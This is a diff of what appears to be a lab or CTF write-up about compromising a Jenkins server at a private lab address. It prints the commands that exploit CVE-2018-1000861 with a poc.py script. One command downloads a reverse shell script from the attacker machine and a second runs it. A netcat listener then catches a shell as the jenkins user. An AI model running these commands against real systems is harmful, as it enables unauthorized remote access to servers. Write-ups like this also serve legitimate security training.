@@ -88,9 +88,11 @@ root@kali: python2 poc.py http://192.168.127.240:8080/ 'whoami'
 [*] Exploit success!(it should be :P)
 ```
 
-with this output i'm now 100% sure that i can get a shell but this script returns no command output but it realy executes the command on the server
+with this output i'm now 100% sure that i can get a shell but this script returns no command output but it realy executes the command on the server.
 
-so i created a reverse shell on my kali machine and served it with python web server :
+## 3.Gaining Shell
+
+So i created a reverse shell on my kali machine and served it with python web server :
 
 ```bash
 root@kali: cat shell.sh                                                                       
@@ -104,7 +106,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 and then used the `poc.py` file to download the shell.sh on the victim :
 
 ```bash
-python2 poc.py http://192.168.127.240:8080/ 'wget http://192.168.127.128/shell.sh -P /dev/shm'
+root@kali: python2 poc.py http://192.168.127.240:8080/ 'wget http://192.168.127.128/shell.sh -P /dev/shm'
 [*] ANONYMOUS_READ disable!
 [*] Bypass with CVE-2018-1000861!
 [*] Exploit success!(it should be :P)
@@ -113,10 +115,25 @@ python2 poc.py http://192.168.127.240:8080/ 'wget http://192.168.127.128/shell.s
 and then start a listener on your system and call the sell.sh file on the victim :
 
 ```bash
-
+root@kali: python2 poc.py http://192.168.127.240:8080/ 'bash /dev/shm/shell.sh'
+[*] ANONYMOUS_READ disable!
+[*] Bypass with CVE-2018-1000861!
+[*] Exploit success!(it should be :P)
 ```
 
+and on my machine :
 
+```bash
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.240] 53568
+bash: no job control in this shell
+bash-4.2$ id
+id
+uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
+```
+
+yes we got the shell.
 
 
 
